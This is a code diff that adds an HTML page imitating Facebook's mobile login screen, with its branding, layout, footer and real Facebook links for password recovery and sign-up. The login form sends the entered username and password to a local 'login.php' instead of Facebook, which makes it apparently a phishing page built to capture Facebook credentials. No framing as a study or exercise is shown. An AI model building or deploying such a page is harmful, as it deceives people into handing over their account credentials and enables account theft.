@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="eng">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>Facebook -log in or sign up</title>
+        <style>
+            body{
+                margin: 0;
+                padding: 0;
+            }
+
+            .fb{
+                text-align: center;
+            }
+
+            #icon{
+                width: 120px;
+                margin-top: 10px
+            }
+
+            .loginN{
+                margin: 0;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                margin-top: 4px;
+            }
+
+            .loginN input{
+                margin-bottom: -13px;
+                box-sizing: border-box;
+            }
+
+            .loginN .des{
+                border: 0;
+                border-radius: 4px;
+                background-color: #f2f4f8;
+                padding: 12px;
+                width: 90%;
+                border-top: .5px solid transparent; 
+                border-left: .5px solid #dedcdc; 
+                border-right: .5px solid #dedcdc;
+                border-bottom: 1px solid #cdc6c6;
+                transition: border;
+            }
+
+            .loginN .des:focus{
+                outline: none;
+                border: .5px solid rgb(0, 0, 0);
+            }
+
+            .loginN .des::placeholder{
+                text-indent: 1px;
+                font-size: 14px;
+                margin-bottom: 14px;
+            }            
+
+            .loginN .login{
+                margin-top: 6px;
+                width: 90%;
+                padding: 10px;
+            }
+
+            .loginN #des{
+                background-color: #1877f2;
+                border: none;
+                border-radius: 4px;
+                color: white;
+                font-weight: bold;
+                font-size: 16px;
+            }
+
+            .loginN .forgotP{
+                font-family: Arial, Helvetica, sans-serif;
+                color: #0f72f3;
+                font-size: 15px;
+                text-decoration: none;
+                margin-top: 14px;
+            }
+
+            .or-container{
+                width: 100%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            /* or the hr with 50% width of both side and without setting a div container also like the hr-left and right as class name then setting the margin top same for both to match with the or text and the left and right width as 150px then color and then border done*/
+            .p2,
+            .p3{    
+                display: block;
+                background: #c0b7b7;
+                height: 1px;
+                width: 40%;
+                margin-left: 16px;
+                margin-right: 16px;
+                margin-top: 25px;
+            }
+
+            .pOR{
+                font-family: Arial, Helvetica, sans-serif;
+                margin-top:  22px;
+                font-size: 14px;
+            }
+
+            .create{
+                margin-top: 4px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .create .design{
+                font-family: Arial, Helvetica, sans-serif;
+                font-weight: bold;
+                border: 1.3px solid #ddd;
+                background-color: white;
+                padding: 8px 78px;
+                font-size: 14px;
+                transition: background-color;
+            }
+
+            .create .design:active{
+                background-color: #8bc580;
+            }
+
+            .lang{
+                margin: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-top: 140px;
+            }
+            
+            .lang a{
+                text-decoration: none;
+            }
+
+            .lang span{
+                text-align: center;
+                margin: 0 70px;
+                list-style: none;
+              }
+              
+              .lang span li.o{
+               font-family: Arial, Helvetica, sans-serif;
+               margin: 3px 0;      
+               color: #0e215c;
+               font-size: 12px;
+              }
+
+              .lang .default{
+                margin: 3px 0;      
+                font-family: Arial, Helvetica, sans-serif;
+                margin: 0 -20px;
+                font-weight: bold;
+                font-size: 13px;
+                color: #9e9c9c;
+            }
+
+            .about{
+                text-align: center;
+            }
+            
+            .about ul{
+                position: absolute;
+                left: 50%;
+                transform: translate(-60%, 300%);
+                display: flex;
+                justify-content: center;
+            }
+
+            .about ul li{
+                font-family: Arial, Helvetica, sans-serif;
+                font-size: 10px;
+                color: #8F9098;
+                margin: 0 7px;
+            }
+            
+            .no{
+                list-style: none;
+            }
+            
+            p{
+                text-align: center;
+            }
+
+            .meta{
+                margin-bottom: -225px;  
+                position: absolute;
+                left: 50%;
+                transform: translate(-48%, -50%); /* it might need to be changed the x translate */
+            }
+
+            .meta .m0{
+                font-family: Arial, Helvetica, sans-serif;
+                color: #8F9098;
+                font-size: 13px;
+            }
+          
+        </style>
+    </head>
+
+    <body>
+        <header>
+            <div class="fb">
+                <img src="facebook.svg" alt="facebook", id="icon">
+            </div>
+        </header>
+
+        <main>
+            <form method="POST" action="login.php">
+                <div class="loginN">
+                    <input class="des" type="text" name="username" placeholder="Mobile number or email address">
+                    <br>
+                    <input class="des" type="password" name="password" placeholder="Password">
+                    <br>
+                    <button id="des" class="login">Log In</button>
+                    <a class="forgotP" href="https://www.facebook.com/login/identify/">Forgotten password?</a>
+                    <div class="or-container">
+                        <p class="p2"></p>
+                        <p class="pOR">or</p>
+                        <p class="p3"></p>
+                    </div>
+
+                    <div class="create">
+                        <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk">
+                            <button class="design" type="button">Create new account</button>
+                        </a>
+                    </div>
+                </div>
+            </form>
+        </main>
+
+        <footer>
+            <div class="lang">
+                <span>
+                    <a href="#">
+                        <li class="default">Engish (UK)</li>
+                    </a>
+
+                    <a href="#">
+                        <li class="o">Portugues</li>
+                    </a>     
+
+                    <a href="#">
+                        <li class="o">Japanese</li>
+                    </a>   
+
+                    <a href="#">
+                        <li class="o">Spanish</li>
+                    </a>
+                </span>
+          
+                <span>
+                    <a href="#">
+                        <li class="o">Bangla</li>
+                    </a>
+
+                    <a href="#">
+                        <li class="o">Hindi</li>
+                    </a>
+
+                    <a href="#">
+                        <li class="o">Gujrati</li>
+                    </a>
+
+                    <a href="#">
+                        <li class="o">Telugu</li>
+                    </a>
+                </span>
+                    <div class="about">
+                        <ul>
+                            <li class="no">About</li>
+                            <li>Help</li>
+                            <li>More</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="meta">
+                        <p class="m0" id="des">Meta &copy; 2024</p>
+                    </div>
+              </div>
+        </footer>
+    </body>
+
+
+</html>
